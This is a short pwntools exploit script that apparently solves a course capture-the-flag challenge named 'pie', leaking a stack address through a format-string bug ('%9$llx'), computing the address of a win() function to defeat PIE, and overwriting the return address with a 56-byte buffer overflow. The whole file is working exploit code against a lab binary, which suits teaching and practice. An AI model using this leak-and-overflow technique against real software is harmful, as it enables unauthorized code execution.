from pwn import *

elf = ELF('./pie')

#p = process('./pie') # test locally
p = remote("cs2107-ctfd-i.comp.nus.edu.sg", 5002)

# Leak 9th stack pointer value using format string vulnerability
p.sendlineafter(b"Option: ", b"2")
p.sendlineafter(b'Please enter your search term:\n', b"%9$llx") # Leak return address from stack
p.recvuntil(b"Nothing found on your search term: ")
leak = int(p.recvline(), 16)
p.sendlineafter(b'Press ENTER to return to menu.\n', b'\n')

# Calculate base address of menu() using leak - offset
offset_of_leak_instruction_from_start_of_menu = 302  # found this from gdb calculation leak-menu()
start_of_menu = leak - offset_of_leak_instruction_from_start_of_menu
win = start_of_menu - 641

# Debug (check if offsets are same as from gdb)
log.info(f"[LEAKED] address: {hex(leak)}")
log.info(f"[START OF MENU] calculated: {hex(start_of_menu)}")
log.info(f"[win()] address: {hex(win)}")

# Buffer overflow payload
payload = b'A' * 56 + p64(win)  # Overwrite return address with win()

p.sendlineafter(b"Option: ", b"3")
p.sendline(payload)
p.interactive()
